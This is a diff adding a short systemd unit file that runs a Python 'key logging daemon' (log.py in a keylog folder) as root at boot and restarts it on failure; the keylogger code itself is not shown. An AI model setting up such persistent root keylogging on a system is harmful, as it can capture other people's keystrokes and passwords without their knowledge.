@@ -1,0 +1,13 @@
+[Unit]
+Description=key logging python daemon
+After=network.target
+
+[Service]
+User=root
+Group=users
+WorkingDirectory=/home/team/Documents/keylog
+ExecStart=/home/team/Documents/keylog/venv/bin/python /home/team/Documents/keylog/log.py
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
